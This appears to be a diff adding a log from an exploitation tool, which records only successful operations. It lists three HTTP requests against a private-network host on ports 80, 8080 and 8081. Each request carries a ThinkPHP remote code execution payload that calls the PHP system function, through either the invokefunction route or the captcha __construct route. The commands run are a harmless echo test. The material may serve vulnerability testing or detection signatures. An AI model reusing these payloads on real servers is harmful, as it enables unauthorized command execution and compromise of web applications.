@@ -1,0 +1,21 @@
+[!] Only successful operations are recorded
+===============2021-01-18 22:57:58===============
+URL: http://192.168.124.128:80/index.php
+|Header:
+|	User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
+|GET:
+|	/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "123"|base64
+===============2021-01-18 22:57:58===============
+URL: http://192.168.124.128:8080/index.php
+|Header:
+|	User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
+|GET:
+|	/index.php?s=captcha
+|POST:
+|	_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "123"|base64
+===============2021-01-18 22:57:58===============
+URL: http://192.168.124.128:8081/index.php
+|Header:
+|	User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
+|GET:
+|	/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "123"|base64
